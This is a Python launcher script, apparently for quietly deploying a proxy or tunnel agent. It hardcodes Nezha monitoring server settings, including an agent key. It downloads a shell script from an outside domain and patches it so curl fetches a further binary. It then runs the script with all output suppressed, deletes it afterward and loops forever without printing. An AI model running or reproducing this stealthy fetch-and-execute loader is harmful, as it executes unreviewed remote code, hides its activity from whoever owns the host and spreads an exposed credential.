import os
import subprocess
import urllib.request
import shutil
import time
from threading import Thread

# Environment Configuration
os.environ.update({
    'UUID': 'faacf142-dee8-48c2-8558-641123eb939c',
    'NEZHA_SERVER': 'nezha.mingfei1981.eu.org',
    'NEZHA_PORT': '443',
    'NEZHA_KEY': 'VSpVZTjkOUIVlVdJsb',
    'HY2_PORT': '5061',
    'ARGO_DOMAIN': '',
    'ARGO_AUTH': '',
    'CFIP': 'jd.bp.cloudns.ch'
})

SCRIPT_URL = 'https://main.ssss.nyc.mn/sb.sh'
TMP_SCRIPT = './tmp_sb.sh'
CLEANUP_DELAY = 60

def download_script(url, dest):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response, open(dest, 'wb') as out_file:
            shutil.copyfileobj(response, out_file)
        return True
    except Exception:
        return False

def cleanup_task():
    time.sleep(CLEANUP_DELAY)
    if os.path.exists('./.tmp'):
        try:
            shutil.rmtree('./.tmp')
        except:
            pass

def main():
    if not download_script(SCRIPT_URL, TMP_SCRIPT):
        return

    if os.path.exists(TMP_SCRIPT):
        with open(TMP_SCRIPT, 'r') as f:
            lines = f.readlines()
        
        with open(TMP_SCRIPT, 'w') as f:
            for line in lines:
                if "Error: neither curl nor" in line:
                    continue
                line = line.replace('$COMMAND sbx "https://$ARCH.ssss.nyc.mn/sbsh"', 
                                    'curl -o sbx "https://$ARCH.ssss.nyc.mn/sbsh"')
                f.write(line)

    try:
        # Run shell script with ALL output redirected to DEVNULL
        subprocess.run(
            ['sh', TMP_SCRIPT], 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )
    except Exception:
        pass
    finally:
        if os.path.exists(TMP_SCRIPT):
            os.remove(TMP_SCRIPT)

    Thread(target=cleanup_task, daemon=True).start()

    # Infinite loop without any print statements
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()